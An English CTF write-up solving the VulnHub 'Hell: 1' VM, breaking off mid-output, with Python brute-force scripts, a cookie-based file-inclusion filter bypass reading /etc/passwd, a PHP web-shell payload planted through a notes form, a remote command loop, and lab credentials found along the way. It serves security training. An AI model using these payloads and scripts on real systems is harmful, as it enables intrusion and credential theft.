# Hell: 1 writeup in english

One way ticket to Hell
----------------------

[Hell is a CTF](http://vulnhub.com/entry/hell-1,95/) whose difficulty is harder than most of others CTF you can find on *VulnHub* just like [Hades](http://devloop.users.sourceforge.net/index.php?article84/solution-du-challenge-hades) was.  

Therefore this article is likely to be long. Prepare yourself for a lot of Python code :-)  

Note than I'm giving you here the steps I used to obtain the flag but it looks like there's several ways to achieve the objectives and maybe (if I have enough time and courage) I may write some more articles on this CTF later just to talk about some binaries and vulnarabilities I brievly saw but didn't used.  

Let me introduce myself before we start : I'm *devloop*, I'm french (and my english is far to be perfect) and I'm the creator of [Wapiti](http://wapiti.sourceforge.net/), a web-application vulnerability scanner you should definitively use (please, always use the latest version) ;-)  

Note that if you like the software you can help the project making a donation via *PayPal* and maybe at the end of the year I may be able to buy a pack of belgium beers :p  

Ready for adenture ?  

So here we go
-------------

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-08 22:15 CEST
Nmap scan report for 192.168.1.29
Host is up (0.00016s latency).
Not shown: 65529 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 6.0p1 Debian 4+deb7u1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f4:bb:f4:22:36:08:61:ef:74:2c:27:e0:b4:a2:69:d3 (DSA)
|   2048 0e:31:1d:cf:04:d0:63:fa:5c:76:f2:dc:22:1c:f1:7c (RSA)
|_  256 e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa (ECDSA)
80/tcp    open     http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/personal/ /super_secret_login_path_muhahaha/
|_http-title: Have fun!
111/tcp   open     rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38687/tcp  status
|_  100024  1          39655/udp  status
666/tcp   open     doom?
1337/tcp  filtered waste
38687/tcp open     status  1 (RPC #100024)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38687/tcp  status
|_  100024  1          39655/udp  status
1 service unrecognized despite returning data --- snip --- :
SF-Port666-TCP:V=6.46%I=7%D=7/8%Time=53BC517C%P=x86_64-suse-linux-gnu%r(NU
SF:LL,7D,"\nWelcome\x20to\x20the\x20Admin\x20Panel\nArchiving\x20latest\x2
SF:0version\x20on\x20webserver\x20\(echoserver\.bak\)\.\.\.\nStarting\x20e
SF:cho\x20server\x20and\x20monitoring\.\.\.\n")%r(GenericLines,81,"\nWelco
SF:me\x20to\x20the\x20Admin\x20Panel\nArchiving\x20latest\x20version\x20on
SF:\x20webserver\x20\(echoserver\.bak\)\.\.\.\nStarting\x20echo\x20server\
--- snip ---
MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)
```

It looks like there is a home-made service listening on port 666 plus two interesting URLs visible in the *robots.txt* file.  

The */personal/* URL is in fact a website dedicated to *g0tmi1k* (*VulnHub*'s creator).  

![g0tmi1k fan club](https://github.com/devl00p/blog/raw/master/images/hell_1.png)

Under the */super\_secret\_login\_path\_muhahaha/* URL we find an *"Admin"* section asking us for credentials.  

Neither *Wapiti* nor *sqlmap* found ways to exploit the login form.  

666.667 Club
------------

Let's take a look at this mysterious 666 port :  

```plain
$ ncat 192.168.1.29 666 -v
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.29:666.

Welcome to the Admin Panel
Archiving latest version on webserver (echoserver.bak)...
Starting echo server and monitoring...
yop
yop
^C
```

Yes, it's an *echo*-like service : you send it some data and the server reply with the same data.  

A message informs us that the binary is archived on the web serveur and indeed we can find an *echoserver.bak* file on the web server's root.  

```plain
$ file echoserver.bak 
echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=e8d0c6cce9504db15d02078b96e4b95e108e2aa2, not stripped
```

Good news : the binary is dynamically linked and not stripped (symbols inside), so it should not be as hard as analysing the [display\_key binary from the Hades CTF](http://devloop.users.sourceforge.net/index.php?article84/solution-du-challenge-hades) :p

```plain
$ nm echoserver.bak 
                 U accept@@GLIBC_2.2.5
                 U bind@@GLIBC_2.2.5
0000000000600c00 A __bss_start
                 U bzero@@GLIBC_2.2.5
000000000040063c t call_gmon_start
0000000000600c00 b completed.6092
0000000000600bf0 D __data_start
0000000000600bf0 W data_start
0000000000400660 t deregister_tm_clones
00000000004006d0 t __do_global_dtors_aux
0000000000600998 t __do_global_dtors_aux_fini_array_entry
0000000000600bf8 D __dso_handle
00000000006009a8 d _DYNAMIC
0000000000600c00 A _edata
0000000000600c08 A _end
00000000004008ac T _fini
00000000004006f0 t frame_dummy
0000000000600990 t __frame_dummy_init_array_entry
0000000000400988 r __FRAME_END__
0000000000600b90 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
                 U htons@@GLIBC_2.2.5
0000000000400558 T _init
0000000000600998 t __init_array_end
0000000000600990 t __init_array_start
00000000004008b8 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
00000000006009a0 d __JCR_END__
00000000006009a0 d __JCR_LIST__
                 w _Jv_RegisterClasses
0000000000400810 T __libc_csu_fini
0000000000400820 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
                 U listen@@GLIBC_2.2.5
000000000040071c T main
                 U read@@GLIBC_2.2.5
0000000000400690 t register_tm_clones
                 U socket@@GLIBC_2.2.5
0000000000400610 T _start
0000000000600c00 D __TMC_END__
                 U write@@GLIBC_2.2.5
```

Supposing that there is a buffer overflow in this binary we ca see that *strcpy()* is not imported, but *read()* may cause an overflow.  

I gave a try to the [checksec](http://www.trapkit.de/tools/checksec.html) script which gives a list of security mecanisms (exploit mitigation) present on ELF binaries.  

```plain
$ checksec.sh --file echoserver.bak
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   echoserver.bak
```

The *NX* bit is set and we don't know if the operating system is configured with *ASLR*... That's not a good start.  

The code is short and eveything happens in the main() :  

```plain
   0x000000000040071c <main+0>:   push   %rbp
   0x000000000040071d <main+1>:   mov    %rsp,%rbp
   0x0000000000400720 <main+4>:   sub    $0x600,%rsp
   0x0000000000400727 <main+11>:  mov    $0x0,%edx
   0x000000000040072c <main+16>:  mov    $0x1,%esi
   0x0000000000400731 <main+21>:  mov    $0x2,%edi
   0x0000000000400736 <main+26>:  callq  0x400600 <socket@plt>
   0x000000000040073b <main+31>:  mov    %eax,-0x4(%rbp)
   0x000000000040073e <main+34>:  lea    -0x600(%rbp),%rax
   0x0000000000400745 <main+41>:  mov    $0x10,%esi
   0x000000000040074a <main+46>:  mov    %rax,%rdi
   0x000000000040074d <main+49>:  callq  0x4005e0 <bzero@plt>
   0x0000000000400752 <main+54>:  movw   $0x2,-0x600(%rbp)
   0x000000000040075b <main+63>:  mov    $0x0,%edi
   0x0000000000400760 <main+68>:  callq  0x400590 <htons@plt>
   0x0000000000400765 <main+73>:  movzwl %ax,%eax
   0x0000000000400768 <main+76>:  mov    %eax,-0x5fc(%rbp)
   0x000000000040076e <main+82>:  mov    $0x29a,%edi
   0x0000000000400773 <main+87>:  callq  0x400590 <htons@plt>
   0x0000000000400778 <main+92>:  mov    %ax,-0x5fe(%rbp)
   0x000000000040077f <main+99>:  lea    -0x600(%rbp),%rcx ; arg2 = struct sockaddr *
   0x0000000000400786 <main+106>: mov    -0x4(%rbp),%eax   ; arg1 = socket
   0x0000000000400789 <main+109>: mov    $0x10,%edx        ; arg3 = socklen_t
   0x000000000040078e <main+114>: mov    %rcx,%rsi
   0x0000000000400791 <main+117>: mov    %eax,%edi
   0x0000000000400793 <main+119>: callq  0x4005d0 <bind@plt>
   0x0000000000400798 <main+124>: mov    -0x4(%rbp),%eax
   0x000000000040079b <main+127>: mov    $0xa,%esi
   0x00000000004007a0 <main+132>: mov    %eax,%edi
   0x00000000004007a2 <main+134>: callq  0x4005c0 <listen@plt>
   0x00000000004007a7 <main+139>: mov    -0x4(%rbp),%eax
   0x00000000004007aa <main+142>: mov    $0x0,%edx
   0x00000000004007af <main+147>: mov    $0x0,%esi
   0x00000000004007b4 <main+152>: mov    %eax,%edi
   0x00000000004007b6 <main+154>: callq  0x4005f0 <accept@plt>
   0x00000000004007bb <main+159>: mov    %eax,-0x8(%rbp)   ; socket client

loop:
   0x00000000004007be <main+162>: lea    -0x5f0(%rbp),%rax
   0x00000000004007c5 <main+169>: mov    $0x5dc,%esi  ; arg2 = len (1500)
   0x00000000004007ca <main+174>: mov    %rax,%rdi    ; arg1 = buffer
   0x00000000004007cd <main+177>: callq  0x4005e0 <bzero@plt>
   0x00000000004007d2 <main+182>: lea    -0x5f0(%rbp),%rcx
   0x00000000004007d9 <main+189>: mov    -0x8(%rbp),%eax
   0x00000000004007dc <main+192>: mov    $0x7d0,%edx      ; arg3 = len = 2000
   0x00000000004007e1 <main+197>: mov    %rcx,%rsi        ; arg2 = buffer
   0x00000000004007e4 <main+200>: mov    %eax,%edi        ; arg1 = socket client
   0x00000000004007e6 <main+202>: mov    $0x0,%eax
   0x00000000004007eb <main+207>: callq  0x4005a0 <read@plt>
   0x00000000004007f0 <main+212>: lea    -0x5f0(%rbp),%rcx
   0x00000000004007f7 <main+219>: mov    -0x8(%rbp),%eax
   0x00000000004007fa <main+222>: mov    $0x5dc,%edx     ; arg3 = len = 1500
   0x00000000004007ff <main+227>: mov    %rcx,%rsi       ; arg2 = buffer
   0x0000000000400802 <main+230>: mov    %eax,%edi       ; arg1 = socket client
   0x0000000000400804 <main+232>: mov    $0x0,%eax
   0x0000000000400809 <main+237>: callq  0x400580 <write@plt>
   0x000000000040080e <main+242>: jmp    0x4007be <main+162>
```

To give you an idea of what the stack looks like with local variables we have :  

%rbp-0x4 : server socket  

%rbp-0x8 : client socket  

%rbp-0x5f0 : buffer (length = 0x5f0 - 0x8 = 1512)  

%rbp-0x5fc : result of the 1st htons cal  

%rbp-0x5fe : result of the 2nd htons cal  

%rbp-0x600 : struct sockaddr \*  

We can see here that only 1512 bytes are given to the buffer but the program *read()* 2000 bytes so we can overwrite some data on the stack.  

Another problem is that we are in the *main* and not in a *standard* function making exploitation different...  

You should also have noticed that it's a 64bits binary and that the program doesn't *fork()* when a client connect. Yes, this program can only handle one connection at a time.  

In fact, if we overflow the stack sending 2000 bytes we can see in the VM screen a Python exception in a file called */root/echoserver.py* and we also receive a message on the socket about a segfault. So in all probability there is a Python wrapper used to launch the binary and relanch it every time it crashes (you will see latter it's not exactly what is happening...)  

To close the subject, I didn't managed to reproduce the segfault on my 64 bits *openSUSE* system so exploitation looks really really hard :(  

What's for sure is that we can overflow the bytes where the client socked is kept thus allowing us to redirect the data we just sent to the standard output (just overwrite the file descriptor of the socket with 0x00000001). If the output of the binary was redirected through a pipe to some kind of shell (bash or Python then it may have been possible to exploit some kind of shell-escaping vulnerability... But I din't manage to execute whatsoever.  

So I just give up to find something else and that's one of the clever thing I made on this CTF.  

All work and no play makes Jack a dull boy
------------------------------------------

As we saw before, the *super\_secret* path brings us to a login page. With the help of *dirb(.sf.net)* I found several more scripts :  

```plain
http://192.168.1.29/super_secret_login_path_muhahaha/check.php
http://192.168.1.29/super_secret_login_path_muhahaha/index.php
http://192.168.1.29/super_secret_login_path_muhahaha/login.php
http://192.168.1.29/super_secret_login_path_muhahaha/mail.php
http://192.168.1.29/super_secret_login_path_muhahaha/notes.php
http://192.168.1.29/super_secret_login_path_muhahaha/panel.php
http://192.168.1.29/super_secret_login_path_muhahaha/personal.php
http://192.168.1.29/super_secret_login_path_muhahaha/server.php
http://192.168.1.29/super_secret_login_path_muhahaha/users.php
http://192.168.1.29/super_secret_login_path_muhahaha/1
```

The file *check.php* redirect us to *index.php* while setting a cookie called *failcount* whose value is incremented each time we fetch *check.php*.  

The file *notes.php* offer us to write a note which must be saved on the disk :  

> "note.txt stored to temporary storage upon submission"

The *users.php* script just give us the name "Jack".  

And the file called just *1* returns an *"INTRUDER ALERT!"* message. I tried adding .html and .php extensions to make sure it's not some kind of *mod\_rewrite* stuff but it looks like the file really has no extensions.  

With a deeper look (you should use *Wireshark* or the builtin developer's tools from your browser, etc.) I noticed that some of those webpages redirects to another webpage (using a *Location* header) but nonetheless some content is also returned.  

You can easily see those contents using your favorite tool (web-application proxy, whatever) or, if you are familiar with Python, leverage the *requests* module just like I did to fetch the returned content. Let's say all the previous URLs discovered with *dirb* were put in an *urls.txt* file, then the following script will do the hard work for us :  

```python
import requests

fd = open("urls.txt")
lines = fd.readlines()
fd.close()

for url in lines:
    url = url.strip()
    r = requests.get(url, allow_redirects=False)
    print url
    print r.headers
    print r.content
    print "==============================="
```

Interesting results are thoses returned for *panel.php* :

```html
<HTML>
<CENTRE>
<H2> Folders </H2>
<TABLE style="width:700px" align="center">
<TR>
        <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD> 
        <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD> 
        <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD> 
        <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD> 
        <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD> 
</TR>
<TR>
        <TD><H4>Server Status</H4></TD>
        <TD><H4>Mail Status</H4></TD>
        <TD><H4>Auth Users</H4></TD>
        <TD><H4>Personal Folder</H4></TD>
        <TD><H4>Notes</H4></TD>
</TR>
</CENTRE>
</HTML>
```

and *personal.php* :  

```html
<HTML>
<FORM name="login" method="post" action="check.php">
<CENTER>
<H1> Personal Folder Login </H1>
<H3>
<STRONG>Username:</STRONG>
<INPUT name="username" id="username" type="text" value=""/>
<BR>
<BR>
<STRONG>Password:</STRONG>
<INPUT name="password" id="password" type="password" value=""/>
<BR>
<BR>
<INPUT name="mysubmit" id="mysubmit" type="submit" value="Login"/>
</H3>
</HTML>
```

First I tried to brute-force the two login forms (*login.php* et *check.php*) with the two respectives scripts :  

```python
import requests
import sys

if len(sys.argv) < 2:
  print "Usage: python {0} <user> <dict_file>".format(sys.argv[0])
  sys.exit()

hdrs = {
    "referer": "http://192.168.1.29/super_secret_login_path_muhahaha/",
    "content-type": "application/x-www-form-urlencoded"
    }
data = {
      "username": sys.argv[1],
      "password": "test",
      "mysubmit": "Login"
    }

fd = open(sys.argv[2])
i = 0

while True:
  word = fd.readline()
  if not word:
    break

  word = word.strip()
  data["password"] = word
  i = i + 1
  if i == 500:
      print "Testing", word
      i = 0

  sess = requests.session()
  r = sess.post("http://192.168.1.29/super_secret_login_path_muhahaha/login.php", data=data, headers=hdrs, allow_redirects=False)
  if "location" in r.headers:
    # en cas d'erreur le script nous redirige avec ce parametre
    if r.headers["location"].endswith("the_user_is_a_failure=1"):
      continue

  print "No redirection or different redirection with password {0}".format(word)
  print r.headers
  print r.content
  break

fd.close()
```

This line is just a separator. *Keep calm and blame Canada*.  

```python
import requests
import sys

if len(sys.argv) < 2:
  print "Usage: python {0} <user> <dict_file>".format(sys.argv[0])
  sys.exit()

hdrs = {
    "referer": "http://192.168.1.29/super_secret_login_path_muhahaha/personnal.php",
    "content-type": "application/x-www-form-urlencoded"
    }
data = {
      "username": sys.argv[1],
      "password": "test",
      "mysubmit": "Login"
    }

fd = open(sys.argv[2])
i = 0

while True:
  word = fd.readline()
  if not word:
    break

  word = word.strip()
  data["password"] = word
  i = i + 1
  if i == 500:
      print "Testing", word
      i = 0

  sess = requests.session()
  r = sess.post("http://192.168.1.29/super_secret_login_path_muhahaha/check.php", data=data, headers=hdrs)
  if """<FORM name="login" method="post" action="login.php">""" in r.content:
      continue

  print "No login form with password {0}".format(word)
  print r.headers
  print r.content
  break

fd.close()
```

I tried to find a valid password for *admin* and *Jack* but unfortunately I didn't found anything :(  

So I looked deeper and deeper and I finally discovered that when the *failcount* counter exceed some value, the webserver gives us a new special cookie *intruder=1*.  

And guess what... If we access the *panel.php* page with this cookie set we can read a the end of the webpage the message *"INTRUDER ALERT!"* :)  

It's a safe bet that the script does a simple *include()* of what was given through the *intruder* cookie (remember the file named *1* discovered previously).  

Indeed when I changed the cookie value to *"server.php"* and asked for *panel.php* again I saw the content *server.php* at the end of the webpage.  

Nevertheless... */etc/passwd* doesn't gives any results and neither does *../../../../../../../etc/passwd*. That's strange because for exemple it works well with *./server.php*.  

So there must be some kind of filters to prevent moving up in the directories.  

What if I set the cookie to *intruder=../server.php* ? BANG ! Data from *server.php* gets appended although it's in the same directory !  

The script simply calls *str\_replace* to removes attemps to go in parents directory and when I set the intruder cookie value to *....//....//....//....//....//....//....//....//etc/passwd* I finally get :  

```plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
george:x:1000:1000:george,,,:/home/george:/bin/bash
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
jack:x:1001:1001::/home/jack:/bin/sh
milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
developers:x:1003:1003::/home/developers:/bin/sh
bazza:x:1004:1004::/home/bazza:/bin/sh
oj:x:1005:1005::/home/oj:/bin/sh
```

So yes we can escape the filter and take a look wherever we want (with the rights of the web server). Furthermore, I now have some more usernames (but I dind't get any more results using the same brute-force scripts seen above).  

I re-used the enumeration script leveraging the *include(*) function I used on the [LAMPSecurity CTF4](http://devloop.users.sourceforge.net/index.php?article96/solution-du-ctf-lampsecurity-ctf4), just modifying the place where the paths are injected :  

```python
import requests

fd = open("logs.txt")

while True:
    word = fd.readline()
    if not word:
        break
    word = word.strip()
    r = requests.get("http://192.168.1.29/super_secret_login_path_muhahaha/panel.php",
            headers={"cookie": "intruder=....//....//....//....//....//....//....//..../{0};".format(word)},
            allow_redirects=False)

    if int(r.headers['content-length']) != 239:
        print "Contenu trouve avec", word

fd.close()
```

And I get :  

```plain
Contenu trouve avec /var/log/lastlog
Contenu trouve avec /var/log/wtmp
Contenu trouve avec /var/run/utmp
Contenu trouve avec /etc/passwd
Contenu trouve avec /etc/group
Contenu trouve avec /etc/hosts
Contenu trouve avec /etc/motd
Contenu trouve avec /etc/issue
Contenu trouve avec /etc/crontab
Contenu trouve avec /etc/inittab
Contenu trouve avec /proc/version
Contenu trouve avec /proc/cmdline
Contenu trouve avec /etc/apache2/apache2.conf
Contenu trouve avec /etc/apache2/sites-enabled/000-default
Contenu trouve avec /etc/apache2/sites-available/default
Contenu trouve avec /etc/ssh/sshd_config
Contenu trouve avec /etc/mysql/my.cnf
Contenu trouve avec /etc/php5/apache2/php.ini
Contenu trouve avec /var/log/faillog
```

We have no read access on the *Apache* logs... How can we transform the include() vulnerability in a RCE (remote code execution) one ?  

The hint is to use the *notes.php* script stroring the data we submit to a *note.txt* file in a *"temporary storage"*.  

Indeed when I submitted *<?php system($\_get["cmd"]); ?>* to *notes.php* just before exploiting the *intruder* vulnerability to include */tmp/note.txt* I was then able to execute commands on the system.  

Some more Python code can give us a poor man's shell to the server :  

```python
import requests
import sys
import urllib

URL = "http://192.168.1.29/super_secret_login_path_muhahaha/panel.php?cmd={0}"

while True:
    cmd = raw_input("$ ").strip()
    if cmd == "exxit":
        sys.exit()
    cmd = urllib.quote(cmd)

    r = requests.get(URL.format(cmd),
            headers={"cookie": "intruder=....//....//....//....//....//....//....//....//tmp/note.txt;"},
            allow_redirects=False)
    print r.content[136:-9]
```

Taking a look at *login.php* I found a password for *Jack* :  

```php
<?PHP
session_start();

function login(){

        $username = mysql_escape_string($_POST["username"]);
        $password = mysql_escape_string($_POST["password"]);
        // mysql_connect("127.0.0.1", "Jack", "zgcR6mU6pX") or die ("Server Error"); I'll change this back once development is done. Got sick of typing my password.  
        mysql_connect("127.0.0.1", "www-data", "website") or die("Server Error");
        mysql_select_db("website") or die("Server Error");
        $sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";
        $res = mysql_query($sql) or die("Server Error");
        $row = mysql_fetch_row($res);
        if ($row[0]) {
                return 1;
        } else {
                return 0;
        }
}

if (login()) {
        $_SESSION["valid"] = 1;
        setcookie(time()+600);
        header('Location: index.php');
} else {
        header('Location: index.php?the_user_is_a_failure=1');
}
?>
```

Those credentials allow us to connect on SSH :  

```plain
jack@hell:~$ ls -alR 
.:
total 28
drwx------ 4 jack jack 4096 Jun 22 18:28 .
drwxr-xr-x 7 root root 4096 Jul  5 21:03 ..
-rwx------ 1 jack jack    1 Jun 22 18:28 .bash_logout
-rwx------ 1 jack jack 3455 Jun 18 12:05 .bashrc
drwx------ 2 jack jack 4096 Jun 18 12:07 g0tmi1k_pics
drwx------ 2 jack jack 4096 Jun 18 12:35 .pgp
-rwx------ 1 jack jack  675 Jan  1  2013 .profile

./g0tmi1k_pics:
total 292
drwx------ 2 jack jack   4096 Jun 18 12:07 .
drwx------ 4 jack jack   4096 Jun 22 18:28 ..
-rwx------ 1 jack jack 180289 Dec  1  2010 1.jpg
-rwx------ 1 jack jack  29494 Sep 12  2013 2.jpg
-rwx------ 1 jack jack  72070 Jun 18 12:06 3.jpg

./.pgp:
total 20
drwx------ 2 jack jack 4096 Jun 18 12:35 .
drwx------ 4 jack jack 4096 Jun 22 18:28 ..
-rwx------ 1 jack jack   39 Jun 18 12:35 note
-rwx------ 1 jack jack 1802 Jun 18 12:20 pgp.priv
-rwx------ 1 jack jack  890 Jun 18 12:24 pgp.pub
```

Using the MySQL credentials (limited access unfortunately) I found the password used for the website (but we have a shell so we don't care now) :  

```plain
mysql> select * from users;
+----------+-----------+
| username | password  |
+----------+-----------+
| Jack     | g0tmi1k69 |
+----------+-----------+
1 row in set (0.00 sec)
```

Pwn 4 Life
----------

*Jack* is a sly little fox encrypting his email communications (the *NSA* is watching you *Jack* !).  

```plain
jack@hell:~$ cat .pgp/note 
The usual password as with everything.

jack@hell:~$ cat /var/mail/jack/received/message.eml 
-----BEGIN PGP MESSAGE-----
Version: BCPG C# v1.6.1.0

hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
=svWU
-----END PGP MESSAGE-----
```

By the way we have read permissions on an email in *George*'s inbox :  

```plain
jack@hell:~$ cat /var/mail/george/signup.eml 
From: admin@rockyou.com
To: super_admin@hell.com
Subject: Account Activation
Date: 13th November 2009

Thanks for signing up for your account. I hope you enjoy our services.
```

It looks like *George* registered on *RockYou*... maybe his password was leaked when *RockYou* was hacked (wanna try to bute-force the SSH accounts ? Then show some patiente, the rockyou wordlist is huge and SSH is not the fastest service to attack).  

Let's continue our exploration with a special focus on *George* :  

```plain
jack@hell:~$ cat /etc/aliases
# /etc/aliases
mailer-daemon: postmaster
postmaster: root
nobody: root
hostmaster: root
usenet: root
news: root
webmaster: root
www: root
ftp: root
abuse: root
noc: root
security: root
root: george
```

So *George* must be our ticket to root.  

```plain
jack@hell:~$ find / -user george 2> /dev/null 
/home/george
/usr/bin/game.py
/usr/bin/lesson101
/var/mail/george
/var/mail/george/signup.eml
jack@hell:~$ ls -l /usr/bin/game.py
-rws--x--x 1 george george 2136 Jun 19 18:12 /usr/bin/game.py
jack@hell:~$ file /usr/bin/game.py
/usr/bin/game.py: setuid executable, regular file, no read permission
jack@hell:~$ game.py
/usr/bin/python: can't open file '/usr/bin/game.py': [Errno 13] Permission denied
jack@hell:~$ file /usr/bin/lesson101
/usr/bin/lesson101: executable, regular file, no read permission
jack@hell:~$ /usr/bin/lesson101
Hello jack - this is a beginning exercise for the course, 'Learning Bad C - 101'

I got it once in !! 3 !! whole guesses, can you do better?

Guess my number!!

Number (1-20): 10
You need to guess higher!
Number (1-20): 15
You need to guess lower!
Number (1-20): 12
You got it in 3 tries, congratulations!

jack@hell:~$ cat rc.local
/sbin/iptables-restore < /root/firewall.rules
/root/echoserver.py&
exit 0

jack@hell:/etc$ ls -ld /root/
drwx-----x 5 root root 4096 Jul  6 18:40 /root/
jack@hell:/etc$ cat /root/firewall.rules
# Generated by iptables-save v1.4.14 on Fri Jun 20 11:13:53 2014
*filter
:INPUT ACCEPT [3:456]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -i eth0 -p tcp -m tcp --dport 1337 -j DROP
COMMIT
# Completed on Fri Jun 20 11:13:53 2014
```

So what ? Nothing ! Notice too that netstat was removed, netcat is not installed and of course nmap neither :'(  

So I used [my own port scanning script in Python](http://devloop.users.sourceforge.net/index.php?article2/dvscan-python-port-scanner) I use twice in a year (you have to edit the script to add the 1337 port a the list) :  

```plain
jack@hell:/tmp$ python dvscan.py 127.0.0.1
dvscan.py 1.0
Launching scan on localhost ['127.0.0.1']
--------------------------------
Port 21 ferme !
>> Port 22 ouvert !
Port 23 ferme !
--- snip ---
Port 8080 ferme !
Port 10000 ferme !

Port ouverts :
--------------
22 : ssh
25 : smtp
80 : http
111 : sunrpc
3306 : mysql
```

Hmmm... Obviously the only thing left to do is to break the PGP crypted message. We have the pair of keys (and it's a good thing to have the full pair...) so it should not be complicated.  

The key is tagged as *PGP* but it's still possible to use it from *GnuPG* using the *--import* option (don't try to install PGP for Linux... bad experience) :  

```plain
$ gpg --import public.pkr
gpg: clef 3F18AB0A : clef publique « jack@cowlovers.com » importée
gpg:       Quantité totale traitée : 1
gpg:                     importées : 1  (RSA: 1)
$ gpg --import private.skr 
gpg: clef 3F18AB0A : clef secrète importée
gpg: clef 3F18AB0A : « jack@cowlovers.com » n'est pas modifiée
gpg:       Quantité totale traitée : 1
gpg:                 non modifiées : 1
gpg:           clefs secrètes lues : 1
gpg:      clefs secrètes importées : 1
```

The *Jack*'s password must be used when GPG ask it :  

```plain
$ gpg secret.pgp
```

Here's the decrypted file :  

```plain
Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed. 

The password is '4J0WWvL5nS'
```

What else ?
-----------

Connected as *milk\_4\_life* I saw a binary with setuid george permission :  

```plain
---s--x--x 1 george george 5743 Jun 19 18:24 game
```

It looks like the program is openening some port :  

```plain
milk_4_life@hell:~$ ./game 
I'm listening
```

So let's launch a port-scan on localhost again :  

```plain
jack@hell:/tmp$ python dvscan.py 127.0.0.1
--- snip ---
Port ouverts :
--------------
22 : ssh
25 : smtp
80 : http
111 : sunrpc
1337 : 1337
3306 : mysql
```

On the server's side a message appeared :  

```plain
Lol nope
```

On connection to the 1337 port (you must set up a SSH tunnel first, as netcat is not on the system) the server offers us to start a game by sending a *START* message.  

Then the server ask us some questions like this : *"Quick what's... 514 x 23?"*.  

The aim is to give valid responses (questions are multiplications only) the fastest as possible.  

Obviously to be fast I have to write some Python code (again) :  

```python
import socket

def send_string(sock, s):
    sock.send(s + "\n")

sock = socket.socket()
sock.connect(('127.0.0.1', 1337))

sock.recv(1024) # Type 'START' to begin
send_string(sock, "START")
sock.recv(1024) # Starting... You have 30 seconds...

while True:
    buff = sock.recv(1024).strip()
    if "Quick what's" in buff:
        # Quick what's... 569 x 452?
        buff = buff.split("Quick what's... ", 1)[1]
        buff = buff.split("?", 1)[0]
        # Fast way is using eval() but are we sure we want that ?
        n1, op, n2 = buff.split()
        n1 = int(n1)
        n2 = int(n2)
        ret = n1 * n2
        send_string(sock, str(ret))
    elif "Final Score" in buff:
        print buff
        break

while True:
    buff = sock.recv(1024).strip()
    if not buff:
        break
    print buff
sock.close()
```

After some time we obtain a reply that is not a question :  

```plain
